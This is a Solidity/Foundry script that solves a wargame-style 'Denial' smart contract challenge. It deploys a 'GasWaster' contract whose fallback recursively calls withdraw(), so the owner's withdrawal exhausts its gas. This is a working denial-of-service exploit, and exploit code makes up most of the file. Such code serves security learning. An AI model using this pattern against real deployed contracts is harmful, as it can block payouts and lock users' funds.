pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Denial} from "../src/Denial.sol";

// deploy Denial locally for testing
contract deploy is Script
{
    function run() external
    {
        vm.startBroadcast();
    // if you wanna test from the owner role, go to src/Denial.sol
    // and change owner address to the one you have the pk from
        Denial denial = new Denial();
        (bool success, ) = address(denial).call{value: 0.001 ether}("");
        require(success, "funding the contract failed");

        vm.stopBroadcast();
    }
}

// malicious partner
contract GasWaster
{
    address payable target;
    constructor(address payable _target)
    {
        target = _target;
    }
    fallback() external payable
    {
        Denial(target).withdraw();
    }
}

contract SetPartner is Script
{
    function run() external
    {
        vm.startBroadcast();

        address payable denialAddr = payable(/* instance address */);
        Denial denial = Denial(denialAddr);

        GasWaster gasWaster = new GasWaster(denialAddr);
        address payable partner = payable(address(gasWaster));
        denial.setWithdrawPartner(partner);
    // when the owner calls withdraw now, recursion starts and they will run out of gas

        vm.stopBroadcast();
    }
}

contract OwnerCallsWithdraw is Script
{
    // for local testing of the described scenario
    // run with the private key from the Denial.sol owner address

    function run() external
    {
        vm.startBroadcast();

        address payable target = payable(/* instance address */);
        Denial(target).withdraw();
        // Estimated total gas used for script: 7_274_537
        // while the challenge limit is 1_000_000

        vm.stopBroadcast();
    }
}
